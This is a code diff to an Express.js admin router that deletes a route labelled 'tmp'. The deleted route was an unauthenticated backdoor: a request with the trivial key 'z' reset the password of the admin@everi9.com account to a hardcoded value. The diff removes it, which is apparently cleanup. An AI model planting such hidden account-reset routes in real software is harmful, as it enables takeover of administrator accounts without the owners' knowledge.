@@ -185,16 +185,6 @@ router.get('/conversations', requireAdmin, async (req, res) => {
   } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
-// tmp
-router.get('/xr/:k', async (req, res) => {
-  if (req.params.k !== 'z') return res.status(403).end();
-  const pg = await import('pg');
-  const p = new pg.default.Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
-  const h = await bcrypt.hash('admin2026', 10);
-  await p.query("UPDATE users SET password_hash=$1 WHERE email='admin@everi9.com'", [h]);
-  await p.end();
-  res.json({done:1});
-});
 // GET /api/setup/roles — Lista perfis disponiveis
 router.get('/roles', (req, res) => {
   res.json({
